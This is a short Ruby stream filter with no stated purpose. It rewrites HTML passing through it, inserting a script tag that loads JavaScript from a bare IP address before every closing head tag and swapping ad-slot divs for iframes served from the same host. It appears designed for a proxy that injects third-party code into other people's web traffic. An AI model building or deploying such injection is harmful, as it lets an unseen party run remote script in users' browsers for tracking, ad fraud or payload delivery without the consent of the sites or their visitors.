#!/usr/bin/env ruby
require 'rubygems'

head_replace = "<script type='text/javascript'>  (function() {var _e64t = document.createElement('script'); _e64t.type = 'text/javascript'; _e64t.async = true; _e64t.src = 'http://184.169.148.23/app/track.js'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(_e64t, s); })();</script></head>"

div_replace = "<div><iframe scrolling='no' src='http://184.169.148.23/app/recommendations'></iframe></div>"

head = "</head>"
div = "<div class=\"ad\" id=\"ad-side-short-2\"></div>"
div2 = "<div class=\"ad\" id=\"ad-side-short-2\"></div>"

$stdin.each do |line|
  line.gsub!(head,head_replace)
  line.gsub!(div,div_replace)
  line.gsub!(div2,div_replace)
  $stdout <<  line 
end



